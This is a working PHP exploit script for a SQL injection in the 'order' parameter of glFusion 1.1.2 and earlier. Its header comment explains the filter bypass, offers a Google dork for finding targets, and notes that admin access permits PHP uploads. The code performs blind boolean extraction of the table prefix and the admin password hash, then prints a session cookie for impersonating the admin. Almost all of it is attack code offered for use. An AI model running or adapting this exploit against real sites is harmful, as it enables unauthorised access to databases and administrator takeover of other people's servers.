&lt;?php
    /*
        glFusion &lt;= 1.1.2 COM_applyFilter()/order sql injection exploit
        by Nine:Situations:Group::bookoo

        working against Mysql &gt;= 4.1
        php.ini independent
		
	  our site: http://retrogod.altervista.org/
        software site: http://www.glfusion.org/

        google dork: &quot;Page created in&quot; &quot;seconds by glFusion&quot; +RSS

        Vulnerability, sql injection in &#039;order&#039; and &#039;direction&#039; arguments:
        look ExecuteQueries() function in /private/system/classes/listfactory.class.php, near line 336:
        ...

        // Get the details for sorting the list
        $this-&gt;_sort_arr[&#039;field&#039;] = isset($_REQUEST[&#039;order&#039;]) ? COM_applyFilter($_REQUEST[&#039;order&#039;]) : $this-&gt;_def_sort_arr[&#039;field&#039;];
        $this-&gt;_sort_arr[&#039;direction&#039;] = isset($_REQUEST[&#039;direction&#039;]) ? COM_applyFilter($_REQUEST[&#039;direction&#039;]) : $this-&gt;_def_sort_arr[&#039;direction&#039;];
        if (is_numeric($this-&gt;_sort_arr[&#039;field&#039;])) {
            $ord = $this-&gt;_def_sort_arr[&#039;field&#039;];
            $this-&gt;_sort_arr[&#039;field&#039;] = SQL_TITLE;
        } else {
            $ord = $this-&gt;_sort_arr[&#039;field&#039;];
        }

        $order_sql = &#039; ORDER BY &#039; . $ord . &#039; &#039; . strtoupper($this-&gt;_sort_arr[&#039;direction&#039;]);
        ...

        filters are inefficient, see COM_applyFilter() which calls COM_applyBasicFilter()
        in /public/lib-common.php near line 5774.

        We are in an ORDER clause and vars are not surrounded by quotes,
        bad chars are ex. &quot;,&quot; , &quot;/&quot; ,&quot;&#039;&quot;, &quot;;&quot;, &quot;\&quot;,&quot;&quot;&quot;,&quot;*&quot;,&quot;`&quot;
	  but what about spaces and &quot;(&quot;... you can use a CASE WHEN .. THEN .. ELSE .. END
	  construct instead of ex. IF(..,..,..) and &quot;--&quot; instead of &quot;/*&quot; to close
	  your query.
	  And ex. the alternative syntax SUBSTR(str FROM n FOR n) instead of
        SUBSTR(str,n,n) in a sub-SELECT statement.
	  Other attacks are possible, COM_applyFilter() is a very common used one.
	
	  Additional notes: &#039;direction&#039; argument is uppercased by strtoupper(),
	  you know that table identifiers on Unix-like systems are case sensitives
	  but not on MS Windows, however I choosed to inject in the &#039;order&#039; one
        for better results.
	  Vars come from the $_REQUEST[] array so you can pass it by $_POST[] or
	  $_COOKIE[], which is not intended I suppose.
	  
        This exploit extracts the hash from users table; also note that you do
        not need to crack the hash, you can authenticate as admin with the
        cookie:
		
	  glfusion=[uid]; glf_password=[hash];
		
	  as admin you can upload php files in public folders!
		
	  Very soft mitigations: glFusion does not show the table prefix in sql
        errors, default however is &#039;gl_&#039;. I prepared a fast routine to extract
        it from information_schema db if availiable.
	  To successfully interrogate MySQL you need at least 2 records in the
        same topic section, however the default installation create 2 links with
        topic &quot;glFusion&quot;
        
    */

        $err[0]=&quot;[!] This script is intended to be launched from the cli!&quot;;
        $err[1]=&quot;[!] You need the curl extesion loaded!&quot;;

	  if (php_sapi_name() &lt;&gt; &quot;cli&quot;) {
            die($err[0]);	
        }
        if (!extension_loaded(&#039;curl&#039;)) {
            $win = (strtoupper(substr(PHP_OS, 0, 3)) === &#039;WIN&#039;) ? true : false;
            if ($win) {
			    !dl(&quot;php_curl.dll&quot;) ? die($err[1]) : nil;
			}
			else {
			    !dl(&quot;php_curl.so&quot;) ? die($err[1]) : nil;
			}
        }

	  function syntax(){
	      print (			
	             &quot;Syntax: php &quot;.$argv[0].&quot; [host] [path] [[port]] [OPTIONS]                \n&quot;.
	             &quot;Options:                                                                 \n&quot;.
		       &quot;--port:[port]       - specify a port                                     \n&quot;.
		       &quot;                      default -&gt; 80                                      \n&quot;.
		       &quot;--prefix            - try to extract table prefix from information.schema\n&quot;.
		       &quot;                      default -&gt; gl_                                     \n&quot;.
		       &quot;--uid:[n]           - specify an uid other than default (2,usually admin)\n&quot;.
		       &quot;--proxy:[host:port] - use proxy                                          \n&quot;.
		       &quot;--enforce           - try even with &#039;not vulnerable&#039; message             &quot;);
	     die();
	  }

        error_reporting(E_ALL ^ E_NOTICE);
        $host=$argv[1];
        $path=$argv[2];
        $prefix=&quot;gl_&quot;;      //default
        $uid=&quot;2&quot;;
        $where= &quot;uid=$uid&quot;; //user id, usually admin, anonymous = 1

	  $argv[2] ? print(&quot;[*] Attacking...\n&quot;) : syntax();
        $_f_prefix=false;
        $_use_proxy=false;
        $port=80;
        $_enforce=false;

        for ($i=3; $i&lt;$argc; $i++){
            if ( stristr($argv[$i],&quot;--prefix&quot;)){
	          $_f_prefix=true;
	      }
	      if ( stristr($argv[$i],&quot;--proxy:&quot;)){
	          $_use_proxy=true;
		    $tmp=explode(&quot;:&quot;,$argv[$i]);
		    $proxy_host=$tmp[1];
		    $proxy_port=(int)$tmp[2];
	      }
	      if ( stristr($argv[$i],&quot;--port:&quot;)){
	          $tmp=explode(&quot;:&quot;,$argv[$i]);
		    $port=(int)$tmp[1];
	      }
	      if ( stristr($argv[$i],&quot;--enforce&quot;)){
	          $_enforce=true;
	      }
	      if ( stristr($argv[$i],&quot;--uid&quot;)){
		    $tmp=explode(&quot;:&quot;,$argv[$i]);
		    $uid=(int)$tmp[1];
		    $where=&quot;uid=$uid&quot;;			
	      }
	  }

        $url = &quot;http://$argv[1]:$port&quot;;

        function _s($url,$request)
        {
            global $_use_proxy,$proxy_host,$proxy_port;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL,$url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request.&quot;\r\n&quot;);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7&quot;);
            curl_setopt($ch, CURLOPT_TIMEOUT, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            if ($_use_proxy){
	        curl_setopt($ch, CURLOPT_PROXY, $proxy_host.&quot;:&quot;.$proxy_port);
            }
            $_d = curl_exec($ch);
	    if (curl_errno($ch)) {
                die(&quot;[!] &quot;.curl_error($ch).&quot;\n&quot;);
            } else {
                curl_close($ch);
            }
            return $_d;
        }

        function chk_err($s){
            if (stripos ($s,&quot;\x41\x6e\x20\x53\x51\x4c\x20\x65\x72\x72\x6f\x72\x20\x68\x61\x73\x20\x6f\x63\x63\x75\x72\x72\x65\x64&quot;)){
	        return true;
	    }
	    else {
	        return false;
	    }
        }

	function xtrct_tpc($_h){
	    $_x=explode(&quot;\x69\x6e\x64\x65\x78\x2e\x70\x68\x70\x3f\x74\x6f\x70\x69\x63\x3d&quot;,$_h);
	    $_y=array();
	    for ($i=1; $i&lt;count($_x); $i++){
                $_tmp=explode(&quot;\x22&quot;,$_x[$i]);
                if ((!in_array($_tmp[0],$_y)) and ($_tmp[0]&lt;&gt;&#039;&#039;)) {
                    $_y[$i]=$_tmp[0];
                }
            }
	    return $_y;
        }

	$url =&quot;http://$host:$port&quot;.$path.&quot;index.php&quot;;
      $out= _s($url,&quot;&quot;);
	$_tpcs=xtrct_tpc($out);
	$_types=array(&quot;links&quot;,&quot;stories&quot;,&quot;filemgmt&quot;,&quot;forum&quot;);
	$_t=false;
	for ($i=0; $i&lt;count($_tpcs); $i++){
	    for ($j=0; $j&lt;count($_types); $j++){
	        $url =&quot;http://$host:$port&quot;.$path.&quot;search.php?query=a+a+a&amp;keyType=all&amp;datestart=&amp;dateend=&amp;topic=&quot;.$_tpcs[$i].&quot;&amp;type=&quot;.$_types[$j].&quot;&amp;author=0&amp;results=25&amp;mode=search&quot;;
              $out= _s($url,&quot;&quot;);
              $mtchs=explode(&quot;\x3e\x32\x2e&quot;, $out);
              if (count($mtchs)==2){
                  $_t=true;
		      break;	
		  }
          }
      }

      if ($_t==true){
          $type = $_types[$j];
          $topic= $_tpcs[$i];
      } else {
          $type=  &quot;links&quot;;         //section with at least 2 records of the same topic
          $topic= &quot;glFusion&quot;;      //existing topic in section
      }

      print(&quot;[*] topic -&gt; &#039;&quot;.$topic.&quot;&#039;, type -&gt; &#039;&quot;.$type.&quot;&#039;\n&quot;);
      $prepend=&quot;query=&amp;topic=&quot;.$topic.&quot;&amp;keyType=phrase&quot;;
	
	//checking for vulnerability existence ...
	$url =&quot;http://$host:$port&quot;.$path.&quot;search.php?&quot;.$prepend.&quot;&amp;datestart=&amp;dateend=1&amp;type=all&amp;author=0&amp;results=25&amp;mode=search&amp;order=&quot;;
      $_d=&quot;order=--;&quot;;
	$out= _s($url,$_d);

	//version compatibility
      if (stripos($out,&quot;\x73\x68\x6f\x75\x6c\x64\x20\x68\x61\x76\x65\x20\x61\x74\x20\x6c\x65\x61\x73\x74\x20\x33\x20\x63\x68\x61\x72\x61\x63\x74\x65\x72\x73&quot;)){
	    $prepend=&quot;query=a+a+a&amp;topic=0&amp;keyType=all&quot;;
	    $url =&quot;http://$host:$port&quot;.$path.&quot;search.php?&quot;.$prepend.&quot;&amp;datestart=&amp;dateend=1&amp;type=all&amp;author=0&amp;results=25&amp;mode=search&quot;;
    	    $out= _s($url,$_d);
	}

      if (chk_err($out)) {
	    print(&quot;[*] Vulnerable ...\n&quot;);
	} else {
	    print(&quot;[!] Not vulnerable ...\n&quot;);
	    if (!$_enforce){
	        die;	
	    }
	}
	
	switch ($type) {
            case $_types[0]:
                $_order = array(&quot;id&quot;,&quot;url&quot;,&quot;description&quot;,&quot;title&quot;,&quot;hits&quot;,&quot;date&quot;,&quot;uid&quot;);
	      break;
            case $_types[1]:
                $_order = array(&quot;id&quot;,&quot;title&quot;,&quot;description&quot;,&quot;date&quot;,&quot;uid&quot;,&quot;hits&quot;,&quot;url&quot;);
            break;
            case $_types[2]:
                $_order = array(&quot;id&quot;,&quot;uid&quot;,&quot;comments&quot;,&quot;hits&quot;,&quot;date&quot;,&quot;description&quot;,&quot;url&quot;);
            break;
            case $_types[3]:
                $_order = array(&quot;id&quot;,&quot;name&quot;,&quot;forum&quot;,&quot;date&quot;,&quot;title&quot;,&quot;description&quot;,&quot;hits&quot;,&quot;uid&quot;);
            break;

      } 	

      function xtrct_lnk($_h){
	    $_x=explode(&quot;\x3e\x31\x2e&quot;,$_h);
          $_x=explode(&quot;\x3c\x61\x20\x68\x72\x65\x66\x3d\x22&quot;,$_x[1]);
          $_x=explode(&quot;\x22&quot;,$_x[1]);
	    return html_entity_decode($_x[0]);
      }

	//checking for exploitability ...
	$sql = urlencode(&quot;(CASE WHEN (SELECT 1) THEN 1 ELSE 1 END) LIMIT 1--&quot;);
      $url =&quot;http://$host:$port&quot;.$path.&quot;search.php?&quot;.$prepend.&quot;&amp;datestart=&amp;dateend=1&amp;type=&quot;.$type.&quot;&amp;author=0&amp;results=25&amp;mode=search&quot;;
      $_d=&quot;order=&quot;.$sql.&quot;;&quot;;
	$out= _s($url,$_d);
      if (chk_err($out)) {
     	    die(&quot;[!] Mysql &lt; 4.1 ...&quot;);
	} else {
	    print &quot;[*] Subquery works, exploiting ...\n&quot;;
	}
	
      $_lnks = array();
	$v = array();
	for ($i=0; $i&lt;count($_order); $i++){
	    $sql = urlencode(&quot;$_order[$i] LIMIT 1--&quot;);
          $url =&quot;http://$host:$port&quot;.$path.&quot;search.php?&quot;.$prepend.&quot;&amp;datestart=&amp;dateend=1&amp;type=&quot;.$type.&quot;&amp;author=0&amp;results=25&amp;mode=search&quot;;
          $_d=&quot;order=&quot;.$sql.&quot;;&quot;;
	    $_o= _s($url,$_d);
          $l=xtrct_lnk($_o);
	    if (!in_array($l,$_lnks)) {
	        array_push($_lnks,$l);
		  array_push($v,$_order[$i]);
	    }
	    if (count($v)&gt;1) {
	        print &quot;[*] &#039;&quot;.$v[0].&quot;&#039; and &#039;&quot;.$v[1].&quot;&#039; in ORDER clause returs different records, good! \n&quot;;
	        break;
	    }
      }

      if  (count($v)&lt;=1) {die(&quot;[!] Unable to interrogate database: &quot;.count(v).&quot; record(s) in table ... need at least 2 with topic &#039;&quot;.$topic.&quot; in section &#039;&quot;.$type.&quot;&#039; !&quot;);}
   	
      function find_prefix(){
          global $_lnks ,$v, $type, $host, $port, $path, $prepend;
          $_table_name=&quot;&quot;;
          $j=1;
          print &quot;[*] Table name -&gt; &quot;;
    	    while (!strstr($_table_name,chr(0))){
              $mn=0x00;$mx=0xff;
	        while (1){
	            if (($mx + $mn) % 2 ==1){
                      $c= round(($mx + $mn) / 2) - 1;
                   } else {
		          $c= round(($mx + $mn) / 2);
	            }
	            $sql = urlencode(&quot;(CASE WHEN (SELECT (ASCII(SUBSTR(TABLE_NAME FROM $j FOR 1)) &gt;= &quot;.$c.&quot;) FROM information_schema.TABLES WHERE TABLE_NAME LIKE 0x25747261636b6261636b636f646573 LIMIT 1) THEN &quot;.$v[0].&quot; ELSE &quot;.$v[1].&quot; END) LIMIT 1--&quot;);
                  $url =&quot;http://$host:$port&quot;.$path.&quot;search.php?&quot;.$prepend.&quot;&amp;datestart=&amp;dateend=1&amp;type=&quot;.$type.&quot;&amp;author=0&amp;results=25&amp;mode=search&quot;;
		      $_d=&quot;order=&quot;.$sql.&quot;;&quot;;
		      $_o= _s($url,$_d);
		      if (chk_err($_o)) {
     	                die(&quot;\n[!] information_schema not availiable!&quot;);
	            }
                  $l=xtrct_lnk($_o);
                  if ($l==$_lnks[0]){
                      $mn = $c;
		      }
                  else {
                      $mx = $c - 1;	
	            }
			
		      if (($mx-$mn==1) or ($mx==$mn)){
		          $sql = urlencode(&quot;(CASE WHEN (SELECT (ASCII(SUBSTR(TABLE_NAME FROM $j FOR 1)) = &quot;.$mn.&quot;) FROM information_schema.tables WHERE TABLE_NAME LIKE 0x25747261636b6261636b636f646573 LIMIT 1) THEN &quot;.$v[0].&quot; ELSE &quot;.$v[1].&quot; END) LIMIT 1--&quot;);
                      $url =&quot;http://$host:$port&quot;.$path.&quot;search.php?&quot;.$prepend.&quot;&amp;datestart=&amp;dateend=1&amp;type=&quot;.$type.&quot;&amp;author=0&amp;results=25&amp;mode=search&quot;;
		          $_d=&quot;order=&quot;.$sql.&quot;;&quot;;
		          $_o= _s($url,$_d);
		          $l=xtrct_lnk($_o);
		          if ($l==$_lnks[0]){
                          print chr($mn);
                          $_table_name.=chr($mn);
                      } else {
	                    print chr($mx);	
	                    $_table_name.=chr($mx);
	                }
	                break;
	            }
	        }
	    $j++;
          }
	    print &quot;\n&quot;;
	    $_prefix = str_replace(&quot;trackbackcodes&quot;,&quot;&quot;,$_table_name);
	    return $_prefix;
      }

      if ($_f_prefix == true) {
          $prefix=find_prefix();
	    print &quot;[*] Table prefix -&gt; &quot;.$prefix.&quot;\n&quot;;
      }

      $c=array();$c=array_merge($c,range(0x30,0x39));$c=array_merge($c,range(0x61,0x66));
      print &quot;[*] hash -&gt; &quot;;
      $_hash=&quot;&quot;;
      for ($j=1; $j&lt;0x21; $j++){
          for ($i=1; $i&lt;=0xff; $i++){
	        $f=false;
 	        if (in_array($i,$c)){
	            $sql = urlencode(&quot;(CASE WHEN (SELECT (ASCII(SUBSTR(PASSWD FROM $j FOR 1))=$i) FROM &quot;.$prefix.&quot;users WHERE $where LIMIT 1) THEN &quot;.$v[0].&quot; ELSE &quot;.$v[1].&quot; END) LIMIT 1--&quot;);
                  $url =&quot;http://$host:$port&quot;.$path.&quot;search.php?&quot;.$prepend.&quot;&amp;datestart=&amp;dateend=1&amp;type=&quot;.$type.&quot;&amp;author=0&amp;results=25&amp;mode=search&quot;;
                  $_d=&quot;order=&quot;.$sql.&quot;;&quot;;
		      $_o= _s($url,$_d);
		      if (chk_err($_o)) {
     	                die(&quot;\n[!] wrong table prefix!&quot;);
	            }
                  $l=xtrct_lnk($_o);
                  if ($l==$_lnks[0]){
                      $f=true;
		          $_hash.=chr($i);
		          print chr($i); break;
		      }
              }
	    }
	    if ($f==false){
              die(&quot;\n[!] Unknown error ...&quot;);		
	    }
      }  
      print &quot;\n[*] your cookie -&gt; glfusion=&quot;.$uid.&quot;; glf_password=&quot;.$_hash.&quot;; glf_theme=nouveau;&quot;;
?&gt;